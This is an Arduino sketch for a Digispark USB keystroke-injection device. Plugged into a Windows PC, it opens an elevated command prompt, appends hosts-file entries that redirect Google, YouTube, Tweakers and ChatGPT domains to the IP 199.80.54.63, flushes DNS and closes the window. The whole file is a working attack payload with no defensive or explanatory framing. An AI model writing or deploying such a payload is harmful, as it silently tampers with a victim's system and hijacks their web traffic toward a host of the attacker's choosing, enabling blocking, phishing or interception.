#include "DigiKeyboard.h"

void setup() {

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
//cmd as admin
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(250);
//redirects the listed urls to the ip address
  DigiKeyboard.println("ECHO 199.80.54.63 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 www.tweakers.nl >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 tweakers.nl >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 youtube.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 www.youtube.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 chatgpt.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
  DigiKeyboard.println("ECHO 199.80.54.63 www.chatgpt.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");

  DigiKeyboard.println("ipconfig /flushdns");
  DigiKeyboard.println("exit");
  for(;;){  }
}
